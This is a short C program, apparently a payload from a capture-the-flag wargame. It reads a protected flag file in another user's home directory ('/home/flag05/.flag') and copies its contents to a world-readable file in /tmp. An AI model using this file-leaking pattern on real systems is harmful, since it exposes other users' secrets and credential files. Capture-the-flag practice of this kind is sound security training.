#include <stdio.h>
int main(void) {
	unsigned char buffer[128];
	FILE* flag = fopen("/home/flag05/.flag", "r");
	FILE* tmploc = fopen("/tmp/wasmflag", "w");
	fread(buffer, sizeof(*buffer), 128, flag);
	fwrite(buffer, sizeof(*buffer), 128, tmploc);
}
